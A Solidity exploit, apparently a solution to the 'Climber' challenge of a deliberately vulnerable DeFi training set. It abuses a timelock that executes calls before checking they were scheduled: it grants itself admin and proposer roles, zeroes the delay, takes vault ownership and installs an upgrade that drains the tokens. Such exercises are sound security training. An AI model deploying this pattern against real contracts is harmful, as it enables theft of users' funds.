// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberVault.sol";
import "./ClimberTimelock.sol";
import "../DamnValuableToken.sol";

contract Attacker12 {
    address[] public targets;
    uint256[] public values;
    bytes[] public dataElements;

    ClimberTimelock public timelock;
    address public timelockAddr;

    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    constructor(address payable _timelockAddr) {
        timelockAddr = _timelockAddr;
        timelock = ClimberTimelock(_timelockAddr);
    }

    function attack(address _attackerAddr, address _vaultAddr) public {
        for (uint256 i = 0; i < 3; i++) {
            targets.push(timelockAddr);
        }
        targets.push(_vaultAddr);
        targets.push(address(this));

        values = new uint256[](targets.length);

        dataElements.push(
            abi.encodeWithSignature("grantRole(bytes32,address)", ADMIN_ROLE, _attackerAddr)
        );
        dataElements.push(
            abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this))
        );
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", 0));
        dataElements.push(abi.encodeWithSignature("transferOwnership(address)", _attackerAddr));
        dataElements.push(abi.encodeWithSignature("schedule()"));

        timelock.execute(targets, values, dataElements, "");
    }

    function schedule() public {
        timelock.schedule(targets, values, dataElements, "");
    }
}

contract Vault2 is ClimberVault {
    function withdraw2(address _to, address _tokenAddr) public {
        DamnValuableToken(_tokenAddr).transfer(_to, 10000000 ether);
    }
}
